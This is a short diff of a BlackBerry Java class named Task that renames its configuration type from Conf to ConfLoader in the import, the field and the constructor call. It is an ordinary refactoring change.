@@ -18,7 +18,7 @@ import net.rim.device.api.system.RuntimeStore;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.action.UninstallAction;
-import blackberry.config.Conf;
+import blackberry.config.ConfLoader;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -63,7 +63,7 @@ public final class Task implements Singleton {
     }
 
     /** The conf. */
-    Conf conf;
+    ConfLoader conf;
 
     /** The status. */
     Status status;
@@ -128,7 +128,7 @@ public final class Task implements Singleton {
                 conf = null;
             }
 
-            conf = new Conf();
+            conf = new ConfLoader();
 
             if (conf.loadConf() == false) {
                 //#ifdef DEBUG
